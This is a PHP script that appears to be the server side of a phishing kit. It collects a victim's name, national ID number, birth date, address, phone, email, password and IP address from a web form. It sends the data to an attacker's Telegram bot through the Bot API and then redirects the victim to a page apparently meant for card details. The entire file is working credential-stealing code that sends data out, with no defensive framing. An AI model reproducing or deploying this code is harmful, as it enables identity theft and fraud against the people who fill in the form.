<?php
if (isset($_POST)) {

$filter = "";
$a1 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["HTTP_X_REAL_IP"] : getenv("REMOTE_ADDR"));
$a2 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["REMOTE_ADDR"] : gethostbyaddr($_SERVER["REMOTE_ADDR"]));


if (isset($_POST["nombre"])) {   
    $a3 = $_POST["nombre"];    
} 

if (isset($_POST["pais"])) {   
    $a4 = $_POST["pais"];  
} 

if (isset($_POST["dni"])) {
    $a5 = $_POST["dni"];
}

if (isset($_POST["year"])) {
    $a6 = $_POST["year"];
}
if (isset($_POST["month"])) {
    $a7 = $_POST["month"];
}

if (isset($_POST["day"])) {
    $a8 = $_POST["day"];
}

if (isset($_POST["sexo"])) {
    $a9 = $_POST["sexo"];
}
if (isset($_POST["nombre_provincia"])) {
    $a10 = $_POST["nombre_provincia"];
} 
 
if (isset($_POST["nombre_localidad"])) {
    $a11 = $_POST["nombre_localidad"];
}

if (isset($_POST["telefono"])) {
    $a12 = $_POST["telefono"];
}
if (isset($_POST["direccion"])) {
    $a13 = $_POST["direccion"];
}

if (isset($_POST["email"])) {
    $a14 = $_POST["email"];
}


if (isset($_POST["clave"])) {
    $a15 = $_POST["clave"];
}


include("assets/c.php");

$mensaje = str_replace(
    array("{1}", "{2}", "{3}", "{4}", "{5}", "{6}", "{7}", "{8}", "{9}", "{10}", "{11}", "{12}", "{13}", "{14}"),
    array($a1, $a2, $a3, $a4, $a5, $a6, $a7, $a8, $a9, $a10, $a11, $a12, $a13, $a14, $a15),
    $message
);

define("BOT_TOKEN", $bottoken);
define("CHAT_ID", $chatid);
function enviar_telegram($msj)

{
    $queryArray = [
        "chat_id" => CHAT_ID,
        "text" => $msj,
    ];
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage?" . http_build_query($queryArray);
    $result = file_get_contents($url);

    header("Location: targeta.php");

?>
    <!--script>window.history.back();</script-->
<?php   }

function enviar()
{
    global $telegram_send, $save_file, $email_send, $mensaje;
    enviar_telegram($mensaje);
}
enviar();
}

?>